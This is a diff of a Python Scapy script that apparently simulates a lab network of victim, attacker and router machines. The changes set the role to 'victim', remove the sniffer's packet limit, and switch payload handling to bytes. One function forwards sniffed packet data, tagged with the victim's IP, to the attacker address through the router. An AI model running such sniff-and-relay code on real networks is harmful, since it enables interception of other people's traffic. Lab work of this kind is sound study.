@@ -6,16 +6,20 @@
 from scapy.all import *
 from copy import deepcopy
 
-role = 'router'
+role = 'victim'
 
-victim_ip = '129.254.0.8'
-attacker_ip = '129.254.0.7'
-router_ip = '129.254.0.4'
+victim_ip = '169.254.0.6'
+attacker_ip = '169.254.0.7'
+router_ip = '169.254.0.4'
+
+#mypkt = IP(dst=router_ip)/TCP()/Raw(load='test1')
+#r1 = sr1(mypkt,iface='eth1',timeout=2)
+#exit()
 
 #Modular packet sniffing function
 def packet_sniffer(my_filter, my_prn):
     print('Calling packet sniffer function.')
-    pkt = sniff(filter=my_filter, count=5, iface='eth1', prn=my_prn)
+    pkt = sniff(filter=my_filter, iface='eth1', prn=my_prn)
 
 #Send packets to a destination via the router VM. The router VM
 #simulates a router on the network that is equipped with the
@@ -25,9 +29,9 @@ def send_to_router(packet):
     true_src = packet[IP].src
     true_dst = packet[IP].dst
     true_dport = packet[TCP].dport
-    true_load = packet[Raw].load.decode("utf-8")
+    true_load = packet[Raw].load
 
-    load_append = '|ORIG_DST=' + true_dst
+    load_append = ('|ORIG_DST=' + true_dst).encode("utf-8")
 
     new_packet = IP(dst=router_ip)/TCP(dport=true_dport)/Raw(load=true_load + load_append)
 
@@ -40,10 +44,10 @@ def send_to_router(packet):
 #Sends packet to attacker (via the router VM)
 def send_to_attacker(packet):
     try:
-        data = packet[Raw].load.decode("utf-8")
+        data = packet[Raw].load
     except:
-        data = ''
-    data += '|VICT_IP='+get_if_addr('eth1')
+        data = ''.encode("utf-8")
+    data += ('|VICT_IP='+get_if_addr('eth1')).encode("utf-8")
     new_packet = IP(dst=attacker_ip)/TCP(dport=80)/Raw(load=data)
 
     send_to_router(new_packet)
@@ -56,15 +60,15 @@ def send_to_attacker(packet):
 # forwarded by the router)
 # Format is: |ORIG_SRC:xxx.xxx.xxx.xxx
 def append_orig_source(data, orig_source):
-    new_data = data + '|ORIG_SRC=' + orig_source
+    new_data = data + ('|ORIG_SRC=' + orig_source).encode("utf-8")
 
     return new_data
 
 def reroute_packet(packet):
     try:
-        data = packet[Raw].load.decode("utf-8")
+        data = packet[Raw].load
     except:
-        data = ''
+        data = ''.encode("utf-8")
     data = append_orig_source(data, packet[IP].src)
 
     forwarded_packet = IP()/TCP()/Raw(load=data)
